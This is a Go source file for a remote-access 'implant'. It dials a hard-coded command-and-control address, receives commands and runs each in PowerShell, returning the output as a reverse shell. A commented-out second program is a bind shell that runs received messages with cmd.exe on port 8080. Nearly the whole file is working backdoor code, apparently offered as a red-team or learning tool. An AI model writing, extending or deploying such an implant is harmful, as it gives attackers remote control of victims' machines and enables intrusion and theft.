package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
	addr, err := net.Dial("tcp", *c2Address)
	if err != nil {
		fmt.Println("Couldn't establish a connection")
		if *attempts == 3 {
			fmt.Println("Error Number of attempts exceeded 3")
			os.Exit(0)
		}
		time.Sleep(3 * time.Second)
		*attempts = *attempts + 1
		callHome(c2Address, attempts)
	}
	addr.Write([]byte("Success\n"))
	return addr, true
}

func listen4Commands(conn net.Conn) string {
	request := make([]byte, 128)
	read_len, err := conn.Read(request)
	if read_len == 0 {
		os.Exit(0)
	}
	if err != nil {
		os.Exit(0)
	}
	command := string(request[:read_len])
	return command
}

func executeCommands(conn net.Conn, command string) {
	fmt.Println("The command to be executed is " + command)
	if command == "stop\n" {
		terminate()
	}
	//cmd := exec.Command("cmd.exe", "/C", command)
	cmd := exec.Command("powershell.exe", "/C", command)
	output, err := cmd.Output()
	if err != nil {
		fmt.Println("Couldnt Exec Command")
	}
	if len(output) < 1 {
		output = []byte("Couldn't execute the command\n")
	}
	conn.Write(output)
}

func terminate() {
	fmt.Println("Terminating Implant")
	time.Sleep(3 * time.Second)
	os.Exit(0)
}

func main() {
	c2Address := "192.168.0.106:443"
	attempts := 0
	fmt.Println("Implant Started")
	conn, result := callHome(&c2Address, &attempts)
	if !result {
		os.Exit(0)
	}
	//conn.Close() why would you ?
	for {
		command := listen4Commands(conn)
		executeCommands(conn, command)
	}
	//time.Sleep(10 * time.Second)
}

// package main

// import (
//     "fmt"
//     "net"
//     "os/exec"
// )

// func main() {
//     // Define the port to listen on
//     port := ":8080"

//     // Start TCP server
//     ln, err := net.Listen("tcp", port)
//     if err != nil {
//         fmt.Println("Error listening:", err.Error())
//         return
//     }
//     defer ln.Close()
//     fmt.Println("Listening on", port)

//     // Accept connections
//     for {
//         conn, err := ln.Accept()
//         if err != nil {
//             fmt.Println("Error accepting connection:", err.Error())
//             return
//         }

//         // Handle connection in a new goroutine
//         go handleConnection(conn)
//     }
// }

// func handleConnection(conn net.Conn) {
//     defer conn.Close()

//     // Read message from the connection
//     buffer := make([]byte, 1024)
//     n, err := conn.Read(buffer)
//     if err != nil {
//         fmt.Println("Error reading:", err.Error())
//         return
//     }

//     // Convert received bytes to string
//     message := string(buffer[:n])
//     fmt.Println("Received message:", message)

//     // Execute the received message as a command
//     cmd := exec.Command("cmd.exe", "/C", message)
//     output, err := cmd.CombinedOutput()
//     if err != nil {
//         fmt.Println("Error executing command:", err.Error())
//         return
//     }

//     // Send the command output back to the client
//     _, err = conn.Write(output)
//     if err != nil {
//         fmt.Println("Error sending response:", err.Error())
//         return
//     }
// }
